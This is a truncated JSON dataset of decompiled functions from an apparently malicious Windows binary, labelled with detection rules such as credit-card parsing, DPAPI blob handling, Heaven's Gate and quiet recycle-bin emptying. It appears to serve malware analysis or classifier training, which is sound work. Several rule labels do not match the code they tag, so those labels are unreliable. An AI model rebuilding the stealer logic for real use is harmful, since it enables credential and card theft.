            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00417e48(int32_t param_1)\n\n{\n    char cVar1;\n    char cVar2;\n    char cVar3;\n    char cVar4;\n    char *arg_8h;\n    uint uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint var_498h;\n    uint var_298h;\n    uint var_294h;\n    uint var_94h;\n    uint var_90h;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint var_80h;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint var_70h;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint var_60h;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint var_50h;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint var_40h;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401293(&var_498h, 0, 0x408);\n    var_90h = *0x41ca10;\n    uStack144 = *0x41ca14;\n    uStack140 = *0x41ca18;\n    uStack136 = *0x41ca1c;\n    var_4h = 0;\n    var_80h = *0x41ca40;\n    uStack128 = *0x41ca44;\n    uStack124 = *0x41ca48;\n    uStack120 = *0x41ca4c;\n    var_298h = 0x80;\n    var_70h = *0x41ca20;\n    uStack112 = *0x41ca24;\n    uStack108 = *0x41ca28;\n    uStack104 = *0x41ca2c;\n    var_60h = *0x41ca70;\n    uStack96 = *0x41ca74;\n    uStack92 = *0x41ca78;\n    uStack88 = *0x41ca7c;\n    var_50h = *0x41ca60;\n    uStack80 = *0x41ca64;\n    uStack76 = *0x41ca68;\n    uStack72 = *0x41ca6c;\n    var_94h = 3;\n    var_40h = *0x41ca80;\n    uStack64 = *0x41ca84;\n    uStack60 = *0x41ca88;\n    uStack56 = *0x41ca8c;\n    var_30h = *0x41ca30;\n    uStack48 = *0x41ca34;\n    uStack44 = *0x41ca38;\n    uStack40 = str.gqw:1._0_4_;\n    var_20h = *0x41ca50;\n    uStack32 = *0x41ca54;\n    uStack28 = *0x41ca58;\n    uStack24 = *0x41ca5c;\n    puVar7 = &var_90h;\n    puVar8 = &var_498h;\n    for (iVar6 = 0x20; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    uVar5 = *(param_1 + 0x1c);\n    arg_8h = *(param_1 + 0x18);\n    var_294h._0_2_ = 1;\n    var_294h._2_1_ = 1;\n    var_8h = uVar5;\n    _var_10h = fcn.0040820b();\n    fcn.00418056(arg_8h, uVar5);\n    cVar1 = arg_8h[3];\n    cVar2 = arg_8h[2];\n    cVar3 = arg_8h[1];\n    cVar4 = *arg_8h;\n    uVar5 = fcn.00401000(uVar5);\n    fcn.00407e70(&var_498h, uVar5, ((cVar1 << 8 | cVar2) << 8 | cVar3) << 8 | cVar4, &var_4h);\n    fcn.00415e92();\n    fcn.00415ede(\"BQAaR$43!QAFff\");\n    return;\n}\n",
        "token_count": 1128
    },
    "00408179": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408179(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uint lpSystemTime;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint var_18h;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint lpFileTime;\n    \n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrA)(param_1, \"\\r\\nDate\");\n    _lpFileTime = 0;\n    lpSystemTime = 0;\n    uStack40 = 0;\n    uStack36 = 0;\n    uStack32 = 0;\n    var_18h = 0;\n    var_14h = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    iVar2 = (*_sym.imp.WININET.dll_InternetTimeToSystemTimeA)(iVar2 + 7, &lpSystemTime, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, &lpFileTime);\n    if (iVar2 == 0) {\n        (*pcVar1)();\n    }\n    (*_sym.imp.webservices.dll_WsFileTimeToDateTime)(&lpFileTime, &var_18h, 0);\n    uVar3 = fcn.00401140(var_18h, var_14h, 0x4e72a000, 0x918);\n    fcn.00401100(uVar3, 0x4e72a000, 0x918);\n    return;\n}\n",
        "token_count": 406
    },
    "0040a667": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a667(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX != 0) {\n        if (((arg_8h != 0) || (arg_ch != 0)) && (in_EDX != 0)) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "0041035f": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041035f(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint in_stack_ffffffd8;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t *hMem;\n    \n    uVar3 = 0;\n    iVar2 = fcn.004105c0(&var_8h);\n    piVar1 = hMem;\n    if (iVar2 != 0) {\n        if (4 < var_8h) {\n            if (*hMem == str.DPAPI._0_4_) {\n                if (*(hMem + 1) == str.DPAPI[4]) {\n                    iVar2 = fcn.004103e4(in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, in_stack_ffffffd4, \n                                         in_stack_ffffffd8, &hMem, &var_ch);\n                    if (iVar2 != 0) {\n                        if (var_ch == 0x20) {\n                            uVar3 = fcn.00410620(arg_10h);\n                        }\n                        (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n                    }\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_LocalFree)(piVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 350
    },
    "00412657": {
        "rules": [
            "parse credit card information/4eef9ae1278b42f592aee8ead6d8bf37"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041274f)\n\nint32_t __fastcall fcn.00412657(int32_t *param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint extraout_ECX;\n    uint *arg_8h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t lpNumberOfBytesRead;\n    int32_t nNumberOfBytesToRead;\n    \n    while( true ) {\n        nNumberOfBytesToRead = 0;\n        iVar3 = (*_sym.imp.KERNEL32.dll_PeekNamedPipe)(param_1[2], 0, 0, 0, &nNumberOfBytesToRead, 0);\n        if (iVar3 == 0) break;\n        if (nNumberOfBytesToRead == 0) {\n            return 1;\n        }\n        iVar3 = fcn.00401000(nNumberOfBytesToRead + 1);\n        lpNumberOfBytesRead = 0;\n        iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)(param_1[2], iVar3, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n        if (iVar4 == 0) break;\n        *(lpNumberOfBytesRead + iVar3) = 0;\n        fcn.00403fc7(iVar3, lpNumberOfBytesRead);\n        iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(1, 0, iVar3, 0xffffffff, 0, 0);\n        uVar2 = fcn.00401000(iVar4 << 2);\n        fcn.00401293(uVar2, 0, iVar4 << 2);\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(1, 0, iVar3, 0xffffffff, uVar2, iVar4);\n        fcn.00401014(iVar3);\n        fcn.0040460a(uVar2);\n        fcn.00403f58(&var_10h);\n        fcn.004040c4();\n        pcVar1 = *(*param_1 + 4);\n        arg_8h = &var_ch;\n        uVar2 = extraout_ECX;\n        fcn.00404656(arg_8h);\n        (*pcVar1)(arg_8h, uVar2);\n        fcn.00406f1d();\n        fcn.00406f1d();\n        var_ch = 0;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    iVar4 = 0;\n    if (iVar3 != 0x6d) {\n        iVar4 = (iVar3 == 0xe8) - 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 643
    },
    "00415c2e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415c2e(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h;\n    \n    arg_8h = 0;\n    do {\n        uVar1 = fcn.00415c58(arg_8h);\n        *(arg_8h + param_1) = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"[uVar1 % 0x3e];\n        arg_8h = arg_8h + 1;\n    } while (arg_8h < 10);\n    *(param_1 + 10) = 0;\n    return;\n}\n",
        "token_count": 140
    },
    "00401230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00401230(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 166
    },
    "00401618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401618(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    piVar1 = in_ECX[2];\n    if (in_ECX[1] <= piVar1) {\n        piVar4 = (piVar1 + 1U) * in_ECX[3];\n        piVar1 = fcn.00406fa7();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar4;\n            piVar1 = var_8h;\n            for (piVar2 = piVar4; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 4;\n            }\n        }\n        piVar1 = in_ECX[2];\n        if (piVar1 != NULL) {\n            piVar2 = var_8h + 2;\n            piVar3 = NULL;\n            do {\n                arg_8h_00 = (-8 - var_8h) + piVar2 + *in_ECX;\n                fcn.004043c7(arg_8h_00);\n                piVar3 = piVar3 + 1;\n                piVar2[-1] = *(arg_8h_00 + 4);\n                *piVar2 = *(arg_8h_00 + 8);\n                piVar2[1] = *(arg_8h_00 + 0xc);\n                piVar2 = piVar2 + 4;\n                piVar1 = in_ECX[2];\n            } while (piVar3 < piVar1);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401cab(*in_ECX);\n            piVar1 = in_ECX[2];\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar4;\n    }\n    piVar4 = *in_ECX;\n    fcn.004043c7(&arg_8h);\n    piVar4[piVar1 * 4 + 1] = arg_ch;\n    piVar4[piVar1 * 4 + 2] = arg_10h;\n    piVar4[piVar1 * 4 + 3] = arg_14h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 662
    },
    "00401719": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401719(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00406fa7();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 4;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 184
    },
    "00401766": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401766(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.00406d65();\n    arg_8h_00 = arg_ch * 0x10 + *in_ECX;\n    fcn.00404656(arg_8h_00);\n    *(arg_8h + 4) = *(arg_8h_00 + 4);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    *(arg_8h + 0xc) = *(arg_8h_00 + 0xc);\n    return arg_8h;\n}\n",
        "token_count": 168
    },
    "004018ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004018ac(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar1 = fcn.00406fa7();\n    if (piVar1 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar1 = piVar3;\n        piVar2 = piVar1 + 1;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            piVar1[2] = 0;\n            piVar1[3] = 0;\n            piVar1 = piVar1 + 3;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 188
    },
    "004018fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004018fe(uint *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    uint *puVar1;\n    \n    fcn.00406d65();\n    puVar1 = arg_ch * 0xc + *in_ECX;\n    *arg_8h = *puVar1;\n    fcn.00404656(puVar1 + 1);\n    fcn.00404656(puVar1 + 2);\n    return arg_8h;\n}\n",
        "token_count": 118
    },
    "0040193f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040193f(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    piVar1 = in_ECX[2];\n    if (in_ECX[1] <= piVar1) {\n        piVar4 = (piVar1 + 1U) * in_ECX[3];\n        var_8h = fcn.00406fa7();\n        if (var_8h == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            *var_8h = piVar4;\n            var_8h = var_8h + 1;\n            piVar1 = var_8h;\n            for (piVar2 = piVar4; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 3;\n            }\n        }\n        piVar1 = in_ECX[2];\n        if (piVar1 != NULL) {\n            piVar2 = var_8h + 2;\n            piVar3 = NULL;\n            do {\n                arg_8h_00 = (-8 - var_8h) + piVar2 + *in_ECX;\n                fcn.004043c7(arg_8h_00);\n                piVar3 = piVar3 + 1;\n                piVar2[-1] = *(arg_8h_00 + 4);\n                *piVar2 = *(arg_8h_00 + 8);\n                piVar2 = piVar2 + 3;\n                piVar1 = in_ECX[2];\n            } while (piVar3 < piVar1);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401d0e(*in_ECX);\n            piVar1 = in_ECX[2];\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar4;\n    }\n    piVar4 = *in_ECX;\n    fcn.004043c7(&arg_8h);\n    piVar4[piVar1 * 3 + 1] = arg_ch;\n    piVar4[piVar1 * 3 + 2] = arg_10h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 620
    },
    "00401a34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401a34(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00406fa7();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 3;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 185
    },
    "00401a81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401a81(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.00406d65();\n    arg_8h_00 = arg_ch * 0xc + *in_ECX;\n    fcn.00404656(arg_8h_00);\n    *(arg_8h + 4) = *(arg_8h_00 + 4);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    return arg_8h;\n}\n",
        "token_count": 144
    },
    "00401abc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401abc(uint arg_8h, uint noname_1, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **in_ECX;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    piVar2 = in_ECX[2];\n    if (in_ECX[1] <= piVar2) {\n        piVar5 = (piVar2 + 1U) * in_ECX[3];\n        var_8h = fcn.00406fa7();\n        if (var_8h == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            *var_8h = piVar5;\n            var_8h = var_8h + 1;\n            piVar2 = var_8h;\n            for (piVar3 = piVar5; piVar3 != NULL; piVar3 = piVar3 + -1) {\n                *piVar2 = 0;\n                piVar2 = piVar2 + 6;\n            }\n        }\n        piVar2 = in_ECX[2];\n        if (piVar2 != NULL) {\n            piVar3 = var_8h + 4;\n            piVar4 = NULL;\n            do {\n                arg_8h_00 = (-0x10 - var_8h) + piVar3 + *in_ECX;\n                fcn.004043c7(arg_8h_00);\n                piVar4 = piVar4 + 1;\n                iVar1 = *(arg_8h_00 + 8);\n                piVar3[-1] = *(arg_8h_00 + 0xc);\n                piVar3[-2] = iVar1;\n                *piVar3 = *(arg_8h_00 + 0x10);\n                piVar3 = piVar3 + 6;\n                piVar2 = in_ECX[2];\n            } while (piVar4 < piVar2);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401d40(*in_ECX);\n            piVar2 = in_ECX[2];\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar5;\n    }\n    piVar5 = *in_ECX;\n    fcn.004043c7(&arg_8h);\n    piVar5[piVar2 * 6 + 2] = arg_10h;\n    piVar5[piVar2 * 6 + 3] = arg_14h;\n    piVar5[piVar2 * 6 + 4] = arg_18h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 695
    },
    "00401bbd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401bbd(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00406fa7();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 6;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 185
    },
    "00401c0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401c0a(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.00406d65();\n    arg_8h_00 = arg_ch * 0x18 + *in_ECX;\n    fcn.00404656(arg_8h_00);\n    uVar1 = *(arg_8h_00 + 0xc);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    *(arg_8h + 0xc) = uVar1;\n    *(arg_8h + 0x10) = *(arg_8h_00 + 0x10);\n    return arg_8h;\n}\n",
        "token_count": 189
    },
    "00401c4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401c4b(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = *(param_1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.004015a1();\n    }\n    fcn.00406f8d();\n    return param_1 + -4;\n}\n",
        "token_count": 92
    },
    "00401c7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401c7a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = *(param_1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.004015d4();\n    }\n    fcn.00406f8d();\n    return param_1 + -4;\n}\n",
        "token_count": 92
    },
    "00401cab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401cab(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0x10 + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -4;\n        fcn.00406f1d();\n        *puVar1 = 0;\n    }\n    fcn.00406f8d();\n    return param_1 + -4;\n}\n",
        "token_count": 137
    },
    "00401cdf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401cdf(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = *(param_1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.004015fb();\n    }\n    fcn.00406f8d();\n    return param_1 + -4;\n}\n",
        "token_count": 89
    },
    "00401d0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401d0e(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0xc + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -3;\n        fcn.00406f1d();\n        *puVar1 = 0;\n    }\n    fcn.00406f8d();\n    return param_1 + -4;\n}\n",
        "token_count": 138
    },
    "00401d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401d40(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0x18 + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -6;\n        fcn.00406f1d();\n        *puVar1 = 0;\n    }\n    fcn.00406f8d();\n    return param_1 + -4;\n}\n",
        "token_count": 138
    },
    "004029af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004029af(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.00406fa7();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1[1] = 0;\n            piVar1[2] = 0;\n            piVar1 = piVar1 + 4;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 206
    },
    "00402a03": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402a03(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    \n    fcn.00406d65();\n    fcn.00402790(arg_ch * 0x10 + *in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 71
    },
    "00402c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402c80(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    \n    fcn.00406d65();\n    fcn.004148d1(arg_ch * 0x30 + *in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 72
    },
    "00402ff8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ff8(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    fcn.00404767(*(in_ECX + 0xc));\n    if (*(in_ECX + 8) != 0) {\n        iVar1 = 0;\n        do {\n            fcn.00404788(*(in_ECX + 4) + iVar1);\n            fcn.00404788(*(in_ECX + 4) + 4 + iVar1);\n            fcn.00404788(*(in_ECX + 4) + 8 + iVar1);\n            fcn.00404788(*(in_ECX + 4) + 0xc + iVar1);\n            fcn.00404740(*(iVar1 + 0x10 + *(in_ECX + 4)), *(iVar1 + 0x14 + *(in_ECX + 4)));\n            fcn.00404767(*(iVar1 + 0x18 + *(in_ECX + 4)));\n            fcn.00404767(*(iVar1 + 0x1c + *(in_ECX + 4)));\n            fcn.00404767(*(iVar1 + 0x20 + *(in_ECX + 4)));\n            uVar2 = uVar2 + 1;\n            iVar1 = iVar1 + 0x28;\n        } while (uVar2 < *(in_ECX + 8));\n    }\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 362
    },
    "0040314b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040314b(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    int32_t iVar6;\n    uint *puVar7;\n    uint *puVar8;\n    char *pcVar9;\n    uint var_5f8h;\n    uint lpCommandLine;\n    uint var_3b8h;\n    uint lpFilename;\n    ushort auStack463 [117];\n    uint var_e0h;\n    uint var_94h;\n    uint var_50h;\n    uint var_48h;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint var_38h;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint lpAppName;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar6 = *(param_2 + 4);\n    if (iVar6 == 0) {\n        pcVar9 = \"shutdown.exe /r /t 